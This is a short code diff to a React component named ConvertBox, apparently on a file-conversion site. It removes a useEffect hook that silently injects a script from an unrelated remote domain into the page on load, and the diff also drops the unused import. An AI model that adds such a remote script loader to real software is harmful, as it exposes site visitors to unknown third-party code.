@@ -15,7 +15,7 @@ import {
   useBreakpointValue,
 } from '@chakra-ui/react';
 import { formatDownloadLabel, formats } from './utils/helpers';
-import { useEffect, useState } from 'react';
+import { useState } from 'react';
 
 interface Props {
   data: any;
@@ -33,22 +33,6 @@ export default function ConvertBox(props: Props) {
       setIsDownloading(false);
     }, 10000); // 10 detik
   };
-
-  useEffect(() => {
-    // Create script element
-    const script = document.createElement('script');
-    script.src = '//hostileconductive.com/53/9b/36/539b36fb48616508ae79b6d45317cdf5.js';
-    script.type = 'text/javascript';
-    script.async = true;
-
-    // Append script to body
-    document.body.appendChild(script);
-
-    // Optional: Clean up script when component unmounts
-    return () => {
-      document.body.removeChild(script);
-    };
-  }, []);
   return (
     <Box
       borderRadius="lg"
